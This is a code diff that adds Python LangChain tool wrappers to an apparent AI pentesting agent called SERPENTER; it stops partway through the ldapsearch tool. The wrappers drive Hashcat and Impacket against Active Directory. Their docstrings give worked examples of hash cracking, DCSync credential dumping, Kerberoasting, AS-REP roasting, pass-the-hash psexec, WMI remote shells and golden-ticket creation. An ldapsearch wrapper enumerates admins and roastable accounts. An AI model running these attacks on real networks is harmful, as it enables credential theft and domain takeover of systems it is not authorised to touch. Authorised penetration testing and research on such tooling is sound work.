@@ -3,7 +3,8 @@ Pentesting tool wrappers for SERPENTER
 """
 
 import subprocess
-from typing import Optional, List
+import shlex
+from typing import Optional, List, ClassVar, Dict
 from langchain.tools import BaseTool
 from pydantic import BaseModel, Field
 
@@ -378,6 +379,1092 @@ class NetExecTool(BaseTool):
         return "\n".join(formatted)
 
 
+class HashcatInput(BaseModel):
+    """Input for Hashcat password cracking"""
+
+    hash_file: str = Field(description="Path to file containing hashes to crack")
+    hash_type: int = Field(
+        description="Hashcat hash mode (e.g., 1000=NTLM, 5600=NetNTLMv2, 13100=Kerberoast, 18200=AS-REP)"
+    )
+    attack_mode: str = Field(
+        default="dictionary",
+        description="Attack mode: 'dictionary', 'brute-force', 'combinator', 'rule-based', 'mask'"
+    )
+    wordlist: Optional[str] = Field(
+        default=None,
+        description="Path to wordlist file (required for dictionary/rule-based attacks)"
+    )
+    rules: Optional[str] = Field(
+        default=None,
+        description="Path to rules file (e.g., /usr/share/hashcat/rules/best64.rule)"
+    )
+    mask: Optional[str] = Field(
+        default=None,
+        description="Mask pattern for brute-force (e.g., '?u?l?l?l?d?d?d?d' for Ulll1234)"
+    )
+    output_file: Optional[str] = Field(
+        default=None,
+        description="Output file for cracked passwords (default: hash_file.cracked)"
+    )
+    extra_args: Optional[str] = Field(
+        default=None,
+        description="Additional hashcat arguments (e.g., '--increment --increment-min=4')"
+    )
+
+
+class HashcatTool(BaseTool):
+    """Tool for password cracking using Hashcat"""
+
+    name: str = "hashcat"
+    description: str = """
+    Crack password hashes using Hashcat - the world's fastest password recovery tool.
+    
+    Use this when you need to:
+    - Crack NTLM hashes from SAM/NTDS dumps (hash_type=1000)
+    - Crack NetNTLMv2 hashes from responder/relay attacks (hash_type=5600)
+    - Crack Kerberoast TGS tickets (hash_type=13100)
+    - Crack AS-REP roasted hashes (hash_type=18200)
+    - Crack Domain Cached Credentials (hash_type=2100)
+    
+    COMMON HASH TYPES (AD-focused):
+    - 1000: NTLM (most common for Windows)
+    - 3000: LM (legacy, weak)
+    - 5500: NetNTLMv1
+    - 5600: NetNTLMv2 (from responder/LLMNR poisoning)
+    - 13100: Kerberos 5 TGS-REP (Kerberoasting)
+    - 18200: Kerberos 5 AS-REP (AS-REP Roasting)
+    - 2100: Domain Cached Credentials 2 (DCC2/mscash2)
+    - 1100: Domain Cached Credentials (DCC/mscash)
+    
+    ATTACK MODES:
+    - dictionary: Use a wordlist (fastest for common passwords)
+    - rule-based: Dictionary + rules for mutations (recommended)
+    - brute-force: Try all combinations with a mask pattern
+    - mask: Same as brute-force
+    - combinator: Combine words from two wordlists
+    
+    MASK CHARACTERS:
+    - ?l = lowercase (a-z)
+    - ?u = uppercase (A-Z)
+    - ?d = digits (0-9)
+    - ?s = special chars
+    - ?a = all printable
+    
+    Examples:
+    - hash_file="/tmp/ntlm.txt", hash_type=1000, attack_mode="dictionary", wordlist="/usr/share/wordlists/rockyou.txt"
+    - hash_file="/tmp/krb.txt", hash_type=13100, attack_mode="rule-based", wordlist="/usr/share/wordlists/rockyou.txt", rules="/usr/share/hashcat/rules/best64.rule"
+    - hash_file="/tmp/hashes.txt", hash_type=1000, attack_mode="brute-force", mask="?u?l?l?l?l?d?d?d"
+    """
+    args_schema: type[BaseModel] = HashcatInput
+
+    def _run(
+        self,
+        hash_file: str,
+        hash_type: int,
+        attack_mode: str = "dictionary",
+        wordlist: Optional[str] = None,
+        rules: Optional[str] = None,
+        mask: Optional[str] = None,
+        output_file: Optional[str] = None,
+        extra_args: Optional[str] = None,
+    ) -> str:
+        """Execute Hashcat password cracking"""
+
+        # Map attack mode to hashcat -a flag
+        attack_modes = {
+            "dictionary": 0,
+            "combinator": 1,
+            "brute-force": 3,
+            "mask": 3,
+            "rule-based": 0,  # Dictionary with rules
+        }
+
+        if attack_mode not in attack_modes:
+            return f"Invalid attack mode '{attack_mode}'. Valid: {', '.join(attack_modes.keys())}"
+
+        # Build hashcat command
+        cmd = ["hashcat"]
+
+        # Hash type
+        cmd.extend(["-m", str(hash_type)])
+
+        # Attack mode
+        cmd.extend(["-a", str(attack_modes[attack_mode])])
+
+        # Output file
+        if output_file:
+            cmd.extend(["-o", output_file])
+        else:
+            cmd.extend(["-o", f"{hash_file}.cracked"])
+
+        # Show cracked passwords in output
+        cmd.append("--show")
+
+        # Potfile to track already cracked
+        cmd.append("--potfile-disable")  # Disable for clean runs, can be enabled
+
+        # Force CPU if no GPU (common in VMs/containers)
+        # cmd.append("--force")  # Uncomment if needed
+
+        # Hash file
+        cmd.append(hash_file)
+
+        # Add wordlist or mask based on attack mode
+        if attack_mode in ["dictionary", "rule-based", "combinator"]:
+            if not wordlist:
+                return "Error: Wordlist required for dictionary/rule-based attacks. Common: /usr/share/wordlists/rockyou.txt"
+            cmd.append(wordlist)
+
+            # Add rules for rule-based attack
+            if rules or attack_mode == "rule-based":
+                rules_file = rules or "/usr/share/hashcat/rules/best64.rule"
+                cmd.extend(["-r", rules_file])
+
+        elif attack_mode in ["brute-force", "mask"]:
+            if not mask:
+                return "Error: Mask required for brute-force attacks. Example: ?u?l?l?l?d?d?d?d"
+            cmd.append(mask)
+
+        # Add extra arguments
+        if extra_args:
+            cmd.extend(extra_args.split())
+
+        # Format command for display
+        cmd_display = " ".join(cmd)
+
+        # For actual cracking, we need a different approach - run without --show first
+        crack_cmd = [c for c in cmd if c != "--show"]
+
+        try:
+            # First, try to show already cracked hashes
+            show_result = subprocess.run(
+                cmd,
+                capture_output=True,
+                text=True,
+                timeout=30,
+            )
+
+            already_cracked = show_result.stdout.strip()
+
+            # Then run the actual cracking (with timeout)
+            # Note: Real cracking can take hours/days, so we use a reasonable timeout
+            crack_result = subprocess.run(
+                crack_cmd,
+                capture_output=True,
+                text=True,
+                timeout=600,  # 10 minute timeout for demo purposes
+            )
+
+            output = crack_result.stdout + crack_result.stderr
+
+            return self._parse_hashcat_output(output, cmd_display, already_cracked, hash_type)
+
+        except subprocess.TimeoutExpired:
+            # Cracking timed out - show progress
+            return f"""Command: {cmd_display}
+
+HASHCAT TIMEOUT (10 minutes)
+Password cracking can take hours or days depending on:
+- Hash complexity
+- Wordlist size
+- Attack mode
+- Hardware (GPU vs CPU)
+
+Consider:
+1. Running hashcat manually in a separate terminal
+2. Using a smaller wordlist first
+3. Using targeted rules (e.g., company name + years)
+4. Running on a machine with GPU support
+
+Check progress with: hashcat --status
+Resume later with: hashcat --restore
+"""
+        except FileNotFoundError:
+            return "Hashcat not installed. Install with: sudo apt install hashcat"
+        except Exception as e:
+            return f"Error running hashcat: {str(e)}"
+
+    def _parse_hashcat_output(
+        self, output: str, cmd_display: str, already_cracked: str, hash_type: int
+    ) -> str:
+        """Parse and format Hashcat output"""
+
+        hash_type_names = {
+            1000: "NTLM",
+            3000: "LM",
+            5500: "NetNTLMv1",
+            5600: "NetNTLMv2",
+            13100: "Kerberos TGS (Kerberoast)",
+            18200: "Kerberos AS-REP",
+            2100: "DCC2 (mscash2)",
+            1100: "DCC (mscash)",
+        }
+
+        formatted = []
+        formatted.append(f"Command: {cmd_display}")
+        formatted.append("")
+        formatted.append(f"HASHCAT RESULTS ({hash_type_names.get(hash_type, f'Mode {hash_type}')}):")
+        formatted.append("─" * 80)
+
+        # Parse cracked passwords
+        cracked = []
+        for line in output.split("\n"):
+            # Hashcat output format: hash:password
+            if ":" in line and not line.startswith("[") and not line.startswith("Session"):
+                cracked.append(line)
+
+        # Add already cracked from potfile
+        if already_cracked:
+            formatted.append("")
+            formatted.append("PREVIOUSLY CRACKED:")
+            for line in already_cracked.split("\n"):
+                if line.strip():
+                    formatted.append(f"  ✓ {line}")
+
+        if cracked:
+            formatted.append("")
+            formatted.append(f"NEWLY CRACKED ({len(cracked)}):")
+            for cred in cracked:
+                formatted.append(f"  ✓ {cred}")
+        else:
+            formatted.append("")
+            formatted.append("No new passwords cracked in this session.")
+
+        # Extract stats from output
+        stats = []
+        for line in output.split("\n"):
+            if any(x in line for x in ["Speed", "Progress", "Recovered", "Time.Started", "Status"]):
+                stats.append(line.strip())
+
+        if stats:
+            formatted.append("")
+            formatted.append("SESSION STATS:")
+            for stat in stats[:10]:
+                formatted.append(f"  {stat}")
+
+        formatted.append("")
+        formatted.append("─" * 80)
+        formatted.append("FULL OUTPUT:")
+        formatted.append(output)
+
+        return "\n".join(formatted)
+
+
+class ImpacketInput(BaseModel):
+    """Input for generic Impacket tool execution"""
+
+    script: str = Field(
+        description="Impacket script name (e.g., 'secretsdump', 'GetUserSPNs', 'psexec', 'wmiexec')"
+    )
+    target: str = Field(description="Target IP or hostname")
+    username: Optional[str] = Field(default=None, description="Username for authentication")
+    password: Optional[str] = Field(default=None, description="Password for authentication")
+    domain: Optional[str] = Field(default=None, description="Domain name (e.g., 'corp.local')")
+    hashes: Optional[str] = Field(
+        default=None,
+        description="NTLM hashes for pass-the-hash (format: 'LM:NT' or ':NT')"
+    )
+    dc_ip: Optional[str] = Field(
+        default=None,
+        description="Domain Controller IP (for Kerberos or when different from target)"
+    )
+    kerberos: bool = Field(
+        default=False,
+        description="Use Kerberos authentication (requires valid TGT)"
+    )
+    aesKey: Optional[str] = Field(
+        default=None,
+        description="AES key for Kerberos authentication"
+    )
+    extra_args: Optional[str] = Field(
+        default=None,
+        description="Additional script-specific arguments (e.g., '-just-dc', '-request', '-outputfile out')"
+    )
+    output_file: Optional[str] = Field(
+        default=None,
+        description="Output file for results (if supported by script)"
+    )
+
+
+class ImpacketTool(BaseTool):
+    """Generic tool for running any Impacket script"""
+
+    name: str = "impacket"
+    description: str = """
+    Run any Impacket script for Windows/AD exploitation and enumeration.
+    
+    AVAILABLE SCRIPTS (common ones):
+    
+    CREDENTIAL EXTRACTION:
+    - secretsdump: Dump SAM/NTDS/LSA secrets, DCSync attack
+      extra_args: "-just-dc", "-just-dc-user USERNAME", "-outputfile FILE"
+    
+    KERBEROS ATTACKS:
+    - GetUserSPNs: Kerberoasting - request TGS for SPNs
+      extra_args: "-request", "-outputfile FILE", "-dc-ip IP"
+    - GetNPUsers: AS-REP Roasting - find users without preauth
+      extra_args: "-request", "-outputfile FILE", "-usersfile FILE"
+    - getTGT: Request TGT ticket
+    - getST: Request Service Ticket
+    - ticketer: Create Golden/Silver tickets
+      extra_args: "-nthash HASH", "-domain-sid SID", "-spn SPN"
+    
+    REMOTE EXECUTION:
+    - psexec: Remote shell via SMB service
+    - wmiexec: Remote shell via WMI (more stealthy)
+    - smbexec: Remote shell via SMB
+    - atexec: Remote execution via Task Scheduler
+    - dcomexec: Remote execution via DCOM
+    
+    ENUMERATION:
+    - lookupsid: Brute force SIDs to find users/groups
+      extra_args: "-domain-sids", "500-550" (RID range)
+    - samrdump: Dump SAM via SAMR
+    - reg: Remote registry operations
+      extra_args: "query -keyName HKLM\\..."
+    - services: Service control
+      extra_args: "list", "start SVCNAME", "stop SVCNAME"
+    - rpcdump: Dump RPC endpoints
+    - smbclient: Interactive SMB client
+      extra_args: "-list", to list shares
+    
+    SMB OPERATIONS:
+    - smbclient: SMB client operations
+    - ntlmrelayx: NTLM relay attacks (requires separate setup)
+    
+    AUTHENTICATION METHODS:
+    1. Password: username + password + domain
+    2. Pass-the-Hash: username + hashes + domain
+    3. Kerberos: username + kerberos=True + dc_ip (requires TGT)
+    4. AES Key: username + aesKey + domain
+    
+    EXAMPLES:
+    
+    # DCSync attack
+    script="secretsdump", target="192.168.56.10", username="admin", password="Pass123", 
+    domain="corp.local", extra_args="-just-dc"
+    
+    # Kerberoasting
+    script="GetUserSPNs", target="192.168.56.10", username="user", password="pass",
+    domain="corp.local", extra_args="-request -outputfile kerberoast.txt"
+    
+    # AS-REP Roasting
+    script="GetNPUsers", target="192.168.56.10", domain="corp.local",
+    extra_args="-usersfile users.txt -request -outputfile asrep.txt"
+    
+    # Remote shell via WMI
+    script="wmiexec", target="192.168.56.20", username="admin", password="Pass123",
+    domain="corp.local"
+    
+    # Pass-the-Hash psexec
+    script="psexec", target="192.168.56.20", username="Administrator",
+    domain="corp.local", hashes=":aad3b435b51404ee"
+    
+    # SID lookup/brute force
+    script="lookupsid", target="192.168.56.10", username="guest", password="",
+    domain="corp.local", extra_args="500-600"
+    """
+    args_schema: type[BaseModel] = ImpacketInput
+
+    # Map of script names to their .py suffix variants
+    SCRIPT_VARIANTS: ClassVar[Dict[str, str]] = {
+        "secretsdump": "secretsdump.py",
+        "getuserspns": "GetUserSPNs.py",
+        "getnpusers": "GetNPUsers.py",
+        "psexec": "psexec.py",
+        "wmiexec": "wmiexec.py",
+        "smbexec": "smbexec.py",
+        "atexec": "atexec.py",
+        "dcomexec": "dcomexec.py",
+        "gettgt": "getTGT.py",
+        "getst": "getST.py",
+        "ticketer": "ticketer.py",
+        "lookupsid": "lookupsid.py",
+        "samrdump": "samrdump.py",
+        "reg": "reg.py",
+        "services": "services.py",
+        "rpcdump": "rpcdump.py",
+        "smbclient": "smbclient.py",
+        "ntlmrelayx": "ntlmrelayx.py",
+        "addcomputer": "addcomputer.py",
+        "rbcd": "rbcd.py",
+        "dacledit": "dacledit.py",
+        "owneredit": "owneredit.py",
+        "exchanger": "exchanger.py",
+        "findDelegation": "findDelegation.py",
+        "getPac": "getPac.py",
+        "goldenPac": "goldenPac.py",
+        "raiseChild": "raiseChild.py",
+        "smbserver": "smbserver.py",
+        "ntfs-read": "ntfs-read.py",
+        "mssqlclient": "mssqlclient.py",
+        "mssqlinstance": "mssqlinstance.py",
+        "dpapi": "dpapi.py",
+        "mimikatz": "mimikatz.py",
+        "wmipersist": "wmipersist.py",
+    }
+
+    def _run(
+        self,
+        script: str,
+        target: str,
+        username: Optional[str] = None,
+        password: Optional[str] = None,
+        domain: Optional[str] = None,
+        hashes: Optional[str] = None,
+        dc_ip: Optional[str] = None,
+        kerberos: bool = False,
+        aesKey: Optional[str] = None,
+        extra_args: Optional[str] = None,
+        output_file: Optional[str] = None,
+    ) -> str:
+        """Execute Impacket script"""
+
+        # Resolve script name to actual binary
+        script_lower = script.lower().replace(".py", "").replace("-", "").replace("_", "")
+        script_binary = self.SCRIPT_VARIANTS.get(script_lower, f"{script}.py")
+
+        # Build credential string for most scripts: [domain/]user[:password]@target
+        cred_string = ""
+        if domain:
+            cred_string = f"{domain}/"
+        if username:
+            cred_string += username
+        if password and not hashes:
+            cred_string += f":{password}"
+        cred_string += f"@{target}"
+
+        # Build command
+        cmd = [script_binary]
+
+        # Some scripts need target differently
+        scripts_without_cred_string = ["ntlmrelayx", "smbserver", "ticketer", "getTGT", "getST"]
+        script_base = script_binary.replace(".py", "")
+        
+        if script_base.lower() in [s.lower() for s in scripts_without_cred_string]:
+            # These scripts have different argument patterns
+            if domain:
+                cmd.extend(["-domain", domain])
+            if username:
+                cmd.extend(["-user", username])
+            if target and script_base.lower() not in ["ticketer", "ntlmrelayx", "smbserver"]:
+                cmd.append(target)
+        else:
+            # Standard credential string format
+            cmd.append(cred_string)
+
+        # Add authentication options
+        if hashes:
+            cmd.extend(["-hashes", hashes])
+
+        if kerberos:
+            cmd.append("-k")
+            cmd.append("-no-pass")
+
+        if aesKey:
+            cmd.extend(["-aesKey", aesKey])
+
+        if dc_ip:
+            cmd.extend(["-dc-ip", dc_ip])
+
+        # Add output file if specified and supported
+        if output_file:
+            cmd.extend(["-outputfile", output_file])
+
+        # Add extra arguments (script-specific)
+        if extra_args:
+            # Split extra_args but preserve quoted strings
+            try:
+                extra_list = shlex.split(extra_args)
+                cmd.extend(extra_list)
+            except ValueError:
+                # Fallback to simple split if shlex fails
+                cmd.extend(extra_args.split())
+
+        # Format command for display (mask password)
+        cmd_display = " ".join(cmd)
+        if password:
+            cmd_display = cmd_display.replace(f":{password}@", ":***@")
+
+        try:
+            result = subprocess.run(
+                cmd,
+                capture_output=True,
+                text=True,
+                timeout=300,  # 5 minute timeout
+            )
+
+            output = result.stdout + result.stderr
+
+            if not output.strip():
+                return f"Command: {cmd_display}\n\nNo output - check credentials and target"
+
+            return self._format_output(output, cmd_display, script_binary)
+
+        except subprocess.TimeoutExpired:
+            return f"Command: {cmd_display}\n\nTimeout after 5 minutes (script may still be running)"
+        except FileNotFoundError:
+            return f"{script_binary} not found. Install Impacket:\n  pipx install impacket\n  # or\n  pip install impacket"
+        except Exception as e:
+            return f"Error running {script_binary}: {str(e)}"
+
+    def _format_output(self, output: str, cmd_display: str, script: str) -> str:
+        """Format Impacket output with command and structured sections"""
+
+        script_lower = script.lower().replace(".py", "")
+        
+        formatted = []
+        formatted.append(f"Command: {cmd_display}")
+        formatted.append("")
+        formatted.append(f"IMPACKET [{script}] RESULTS:")
+        formatted.append("─" * 80)
+
+        # Script-specific parsing
+        if "secretsdump" in script_lower:
+            return self._parse_secretsdump(output, cmd_display)
+        elif "getuserspns" in script_lower:
+            return self._parse_kerberoast(output, cmd_display)
+        elif "getnpusers" in script_lower:
+            return self._parse_asrep(output, cmd_display)
+        elif "lookupsid" in script_lower:
+            return self._parse_lookupsid(output, cmd_display)
+        else:
+            # Generic output formatting
+            formatted.append("")
+            formatted.append(output)
+            formatted.append("")
+            formatted.append("─" * 80)
+            return "\n".join(formatted)
+
+    def _parse_secretsdump(self, output: str, cmd_display: str) -> str:
+        """Parse secretsdump output"""
+        formatted = [f"Command: {cmd_display}", "", "SECRETSDUMP RESULTS:", "─" * 80]
+
+        sam_hashes = []
+        ntds_hashes = []
+        lsa_secrets = []
+        kerberos_keys = []
+        errors = []
+
+        current_section = None
+        for line in output.split("\n"):
+            line_stripped = line.strip()
+
+            if "[*] Dumping local SAM" in line:
+                current_section = "sam"
+            elif "[*] Dumping Domain Credentials" in line or "NTDS.DIT" in line:
+                current_section = "ntds"
+            elif "[*] Dumping LSA" in line:
+                current_section = "lsa"
+            elif "Kerberos keys" in line.lower():
+                current_section = "kerberos"
+
+            if ":::" in line_stripped and not line_stripped.startswith("["):
+                if current_section == "sam":
+                    sam_hashes.append(line_stripped)
+                else:
+                    ntds_hashes.append(line_stripped)
+            elif "aes256-cts" in line_stripped.lower() or "aes128-cts" in line_stripped.lower():
+                kerberos_keys.append(line_stripped)
+            elif "DPAPI" in line_stripped or "NL$KM" in line_stripped or "_SC_" in line_stripped:
+                lsa_secrets.append(line_stripped)
+            elif "[-]" in line_stripped:
+                errors.append(line_stripped)
+
+        if ntds_hashes:
+            formatted.extend(["", f"NTDS HASHES ({len(ntds_hashes)} accounts):"])
+            formatted.extend(f"  {h}" for h in ntds_hashes[:100])
+            if len(ntds_hashes) > 100:
+                formatted.append(f"  ... and {len(ntds_hashes) - 100} more")
+
+        if sam_hashes:
+            formatted.extend(["", f"SAM HASHES ({len(sam_hashes)} accounts):"])
+            formatted.extend(f"  {h}" for h in sam_hashes)
+
+        if kerberos_keys:
+            formatted.extend(["", f"KERBEROS KEYS ({len(kerberos_keys)}):"])
+            formatted.extend(f"  {k}" for k in kerberos_keys[:30])
+
+        if lsa_secrets:
+            formatted.extend(["", f"LSA SECRETS ({len(lsa_secrets)}):"])
+            formatted.extend(f"  {s}" for s in lsa_secrets[:30])
+
+        if errors:
+            formatted.extend(["", "ERRORS:"])
+            formatted.extend(f"  {e}" for e in errors[:10])
+
+        if not any([ntds_hashes, sam_hashes, kerberos_keys, lsa_secrets]):
+            formatted.extend(["", "RAW OUTPUT:", output])
+
+        formatted.extend(["", "─" * 80])
+        return "\n".join(formatted)
+
+    def _parse_kerberoast(self, output: str, cmd_display: str) -> str:
+        """Parse GetUserSPNs (Kerberoasting) output"""
+        formatted = [f"Command: {cmd_display}", "", "KERBEROASTING RESULTS:", "─" * 80]
+
+        spns = []
+        tickets = []
+        
+        for line in output.split("\n"):
+            if "$krb5tgs$" in line:
+                tickets.append(line.strip())
+            elif "ServicePrincipalName" not in line and "/" in line and "@" not in line:
+                # Likely an SPN entry
+                if line.strip():
+                    spns.append(line.strip())
+
+        if spns:
+            formatted.extend(["", f"SERVICE PRINCIPAL NAMES ({len(spns)}):"])
+            formatted.extend(f"  {s}" for s in spns)
+
+        if tickets:
+            formatted.extend(["", f"TGS TICKETS CAPTURED ({len(tickets)}):"])
+            for t in tickets:
+                # Truncate the hash for display
+                if len(t) > 150:
+                    formatted.append(f"  {t[:150]}...")
+                else:
+                    formatted.append(f"  {t}")
+            formatted.extend(["", "NEXT STEPS:", "  • Save tickets to file", 
+                           "  • Crack with: hashcat -m 13100 tickets.txt wordlist.txt"])
+
+        if not spns and not tickets:
+            formatted.extend(["", "RAW OUTPUT:", output])
+
+        formatted.extend(["", "─" * 80])
+        return "\n".join(formatted)
+
+    def _parse_asrep(self, output: str, cmd_display: str) -> str:
+        """Parse GetNPUsers (AS-REP Roasting) output"""
+        formatted = [f"Command: {cmd_display}", "", "AS-REP ROASTING RESULTS:", "─" * 80]
+
+        asrep_hashes = []
+        vuln_users = []
+        
+        for line in output.split("\n"):
+            if "$krb5asrep$" in line:
+                asrep_hashes.append(line.strip())
+            elif "DONT_REQUIRE_PREAUTH" in line or "does not require" in line.lower():
+                vuln_users.append(line.strip())
+
+        if vuln_users:
+            formatted.extend(["", f"VULNERABLE USERS (no preauth required) ({len(vuln_users)}):"])
+            formatted.extend(f"  {u}" for u in vuln_users)
+
+        if asrep_hashes:
+            formatted.extend(["", f"AS-REP HASHES CAPTURED ({len(asrep_hashes)}):"])
+            for h in asrep_hashes:
+                if len(h) > 150:
+                    formatted.append(f"  {h[:150]}...")
+                else:
+                    formatted.append(f"  {h}")
+            formatted.extend(["", "NEXT STEPS:", "  • Save hashes to file",
+                           "  • Crack with: hashcat -m 18200 asrep.txt wordlist.txt"])
+
+        if not asrep_hashes and not vuln_users:
+            formatted.extend(["", "RAW OUTPUT:", output])
+
+        formatted.extend(["", "─" * 80])
+        return "\n".join(formatted)
+
+    def _parse_lookupsid(self, output: str, cmd_display: str) -> str:
+        """Parse lookupsid output"""
+        formatted = [f"Command: {cmd_display}", "", "SID LOOKUP RESULTS:", "─" * 80]
+
+        users = []
+        groups = []
+        
+        for line in output.split("\n"):
+            if "(SidTypeUser)" in line:
+                users.append(line.strip())
+            elif "(SidTypeGroup)" in line or "(SidTypeAlias)" in line:
+                groups.append(line.strip())
+
+        if users:
+            formatted.extend(["", f"USERS FOUND ({len(users)}):"])
+            formatted.extend(f"  {u}" for u in users[:50])
+            if len(users) > 50:
+                formatted.append(f"  ... and {len(users) - 50} more")
+
+        if groups:
+            formatted.extend(["", f"GROUPS FOUND ({len(groups)}):"])
+            formatted.extend(f"  {g}" for g in groups[:30])
+
+        if not users and not groups:
+            formatted.extend(["", "RAW OUTPUT:", output])
+
+        formatted.extend(["", "─" * 80])
+        return "\n".join(formatted)
+
+
+class LdapsearchInput(BaseModel):
+    """Input for ldapsearch LDAP queries"""
+
+    target: str = Field(description="LDAP server IP or hostname (usually Domain Controller)")
+    base_dn: Optional[str] = Field(
+        default=None,
+        description="Base DN for search (e.g., 'DC=corp,DC=local'). Auto-detected if not provided."
+    )
+    query_type: Optional[str] = Field(
+        default=None,
+        description="Preset query: 'users', 'computers', 'groups', 'admins', 'dcs', 'spns', 'asrep', 'unconstrained', 'gpos', 'trusts', 'all'"
+    )
+    filter: Optional[str] = Field(
+        default=None,
+        description="Custom LDAP filter (e.g., '(objectClass=user)', '(&(objectClass=user)(adminCount=1))')"
+    )
+    attributes: Optional[str] = Field(
+        default=None,
+        description="Attributes to return (comma-separated, e.g., 'cn,sAMAccountName,memberOf'). Use '*' for all."
+    )
+    username: Optional[str] = Field(
+        default=None,
+        description="Username for authentication (DOMAIN\\user or user@domain.local)"
+    )
+    password: Optional[str] = Field(
+        default=None,
+        description="Password for authentication"
+    )
+    anonymous: bool = Field(
+        default=False,
+        description="Attempt anonymous bind (no credentials)"
+    )
+    use_ssl: bool = Field(
+        default=False,
+        description="Use LDAPS (port 636) instead of LDAP (port 389)"
+    )
+    page_size: int = Field(
+        default=1000,
+        description="Page size for large result sets"
+    )
+
+
+class LdapsearchTool(BaseTool):
+    """Tool for LDAP enumeration using ldapsearch"""
+
+    name: str = "ldapsearch"
+    description: str = """
+    Query Active Directory via LDAP using ldapsearch for enumeration.
+    
+    Use this when you need to:
+    - Enumerate domain users, groups, computers
+    - Find privileged accounts (Domain Admins, adminCount=1)
+    - Discover service accounts with SPNs (Kerberoastable)
+    - Find AS-REP roastable accounts (no preauth)
+    - Enumerate Group Policy Objects (GPOs)
+    - Find domain trusts
+    - Find unconstrained delegation
+    - Custom LDAP queries
+    
+    PRESET QUERIES (use query_type parameter):
+    - users: All user accounts
+    - computers: All computer accounts
+    - groups: All groups
+    - admins: Users with adminCount=1 (privileged)
+    - dcs: Domain Controllers
+    - spns: Users with SPNs (Kerberoastable)
+    - asrep: Users without preauth (AS-REP roastable)
+    - unconstrained: Accounts with unconstrained delegation
+    - gpos: Group Policy Objects
+    - trusts: Domain trusts
+    - all: Basic domain enumeration
+    
+    AUTHENTICATION:
+    - Authenticated: Provide username and password
+    - Anonymous: Set anonymous=True (limited results)
+    - Username formats: DOMAIN\\user, user@domain.local, or just user
+    
+    EXAMPLES:
+    
+    # Enumerate all users (authenticated)
+    target="192.168.56.10", query_type="users", username="CORP\\user", password="pass"
+    
+    # Find Kerberoastable accounts
+    target="192.168.56.10", query_type="spns", username="user@corp.local", password="pass"
+    
+    # Find AS-REP roastable accounts
+    target="192.168.56.10", query_type="asrep", username="CORP\\user", password="pass"
+    
+    # Find Domain Admins
+    target="192.168.56.10", query_type="admins", username="user@corp.local", password="pass"
+    
+    # Custom query for disabled accounts
+    target="192.168.56.10", filter="(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))",
+    attributes="cn,sAMAccountName", username="user", password="pass"
+    
+    # Anonymous enumeration attempt
+    target="192.168.56.10", query_type="users", anonymous=True
+    
+    # Query with SSL
+    target="192.168.56.10", query_type="users", username="user", password="pass", use_ssl=True
+    """
+    args_schema: type[BaseModel] = LdapsearchInput
+
+    # Preset LDAP filters for common AD queries
+    QUERY_PRESETS: ClassVar[Dict[str, tuple]] = {
+        "users": (
+            "(objectClass=user)",
+            "cn,sAMAccountName,distinguishedName,memberOf,userAccountControl,description"
+        ),
+        "computers": (
+            "(objectClass=computer)",
+            "cn,sAMAccountName,dNSHostName,operatingSystem,operatingSystemVersion"
+        ),
+        "groups": (
+            "(objectClass=group)",
+            "cn,sAMAccountName,description,member,distinguishedName"
+        ),
+        "admins": (
+            "(&(objectClass=user)(adminCount=1))",
+            "cn,sAMAccountName,memberOf,description,distinguishedName"
+        ),
+        "dcs": (
+            "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))",
+            "cn,sAMAccountName,dNSHostName,operatingSystem"
+        ),
+        "spns": (
+            "(&(objectClass=user)(servicePrincipalName=*)(!(objectClass=computer)))",
+            "cn,sAMAccountName,servicePrincipalName,memberOf"
+        ),
+        "asrep": (
+            "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))",
+            "cn,sAMAccountName,distinguishedName"
+        ),
+        "unconstrained": (
+            "(userAccountControl:1.2.840.113556.1.4.803:=524288)",
+            "cn,sAMAccountName,distinguishedName,objectClass"
+        ),
+        "gpos": (
+            "(objectClass=groupPolicyContainer)",
+            "cn,displayName,gPCFileSysPath"
+        ),
+        "trusts": (
+            "(objectClass=trustedDomain)",
+            "cn,trustPartner,trustDirection,trustType,trustAttributes"
+        ),
+        "all": (
+            "(objectClass=*)",
+            "cn,sAMAccountName,objectClass"
+        ),
+    }
+
+    def _run(
+        self,
+        target: str,
+        base_dn: Optional[str] = None,
+        query_type: Optional[str] = None,
+        filter: Optional[str] = None,
+        attributes: Optional[str] = None,
+        username: Optional[str] = None,
+        password: Optional[str] = None,
+        anonymous: bool = False,
+        use_ssl: bool = False,
+        page_size: int = 1000,
+    ) -> str:
+        """Execute ldapsearch query"""
+
+        # Determine filter and attributes
+        ldap_filter = filter
+        attrs = attributes
+
+        if query_type and query_type.lower() in self.QUERY_PRESETS:
+            preset_filter, preset_attrs = self.QUERY_PRESETS[query_type.lower()]
+            if not ldap_filter:
+                ldap_filter = preset_filter
+            if not attrs:
+                attrs = preset_attrs
+
+        if not ldap_filter:
+            ldap_filter = "(objectClass=*)"
+
+        # Build ldapsearch command
+        cmd = ["ldapsearch", "-x"]  # -x for simple authentication
+
+        # LDAP URI
+        if use_ssl:
+            cmd.extend(["-H", f"ldaps://{target}:636"])
+        else:
+            cmd.extend(["-H", f"ldap://{target}:389"])
+
+        # Authentication
+        if not anonymous and username and password:
+            # Handle different username formats
+            bind_dn = username
+            if "\\" in username:
+                # DOMAIN\user format - convert to user@domain style or keep as is
+                pass
+            elif "@" not in username and base_dn:
+                # Plain username - try to construct UPN
+                domain = base_dn.replace("DC=", "").replace(",", ".")
+                bind_dn = f"{username}@{domain}"
+
+            cmd.extend(["-D", bind_dn])
+            cmd.extend(["-w", password])
+
+        # Base DN (try to auto-detect from target if not provided)
+        if base_dn:
+            cmd.extend(["-b", base_dn])
+        else:
+            # Try to query rootDSE first to get defaultNamingContext
+            # For now, user should provide base_dn
+            cmd.extend(["-b", ""])  # Root DSE query
+
+        # Page size for large results
+        cmd.extend(["-E", f"pr={page_size}/noprompt"])
+
+        # Add filter
+        cmd.append(ldap_filter)
+
+        # Add attributes
+        if attrs:
+            cmd.extend(attrs.replace(" ", "").split(","))
+
+        # Format command for display (mask password)
+        cmd_display = " ".join(cmd)
+        if password:
+            cmd_display = cmd_display.replace(password, "***")
+
+        try:
+            result = subprocess.run(
+                cmd,
+                capture_output=True,
+                text=True,
+                timeout=120,  # 2 minute timeout
+            )
+
+            output = result.stdout + result.stderr
+
+            if not output.strip():
+                return f"Command: {cmd_display}\n\nNo output - check connectivity and credentials"
+
+            return self._parse_ldap_output(output, cmd_display, query_type)
+
+        except subprocess.TimeoutExpired:
